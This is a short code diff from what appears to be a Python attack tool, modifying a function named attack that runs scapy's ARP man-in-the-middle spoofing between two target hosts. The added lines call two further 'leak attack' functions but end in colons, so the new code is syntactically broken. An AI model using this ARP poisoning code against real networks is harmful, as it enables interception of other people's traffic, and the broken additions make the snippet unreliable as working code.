@@ -8,7 +8,9 @@ def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
     scapy.layers.l2.arp_mitm(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface)
     # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff-ff-ff-ff-ff-ff", "ff-ff-ff-ff-ff-ff", False, "ff-ff-ff-ff-ff-ff", "Ethernet2")
     # scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Broadcast, target_mac, iface)
-    return "Attack Sent"
+    ARP_Leak_Attack(T1ip):
+    Ethernet_Leak_Attack(T1ip):
+    return "Attacks Sent"
 
 
 # linux implementation:
